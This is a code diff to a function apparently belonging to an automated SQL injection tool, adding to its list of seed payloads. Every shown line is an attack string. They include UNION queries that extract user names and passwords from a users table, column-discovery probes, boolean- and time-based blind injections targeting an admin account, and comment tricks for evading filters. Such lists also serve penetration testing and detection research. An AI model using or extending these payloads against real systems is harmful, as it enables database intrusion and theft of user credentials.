@@ -53,9 +53,12 @@ def run_prometheus():
     if not base_payloads:
         base_payloads = [
           "1 OR 1=1", "1 AND 1=1", "1 OR true", "1 UNION SELECT 1,2", 
+          "1 ORDER BY 1", "1 ORDER BY 2", "1 ORDER BY 5", # Column Discovery Seeds
           "1 UNION SELECT user,password FROM users", # Targeted Password Seed
           "1 UNION SELECT password,NULL FROM users", # Targeted Password Seed
           "1 UNION SELECT 1,group_concat(user,0x3a,password) FROM users", # Advanced Seed
+          "1 AND (SELECT 1 FROM users WHERE user=0x61646d696e AND LENGTH(password)>5)", # Blind Seed
+          "1 AND (SELECT IF(1=1,SLEEP(5),1))", # Time Blind Seed
           "1 UNION SELECT database(),user()", "1 UNION SELECT NULL,NULL",
           "1 || 2=2", "1 && 3=3", "1 XOR 1=2", "1 UNION/*bypass*/SELECT 1,2",
           "1/*!50000UNION*//*!50000SELECT*/1,2"
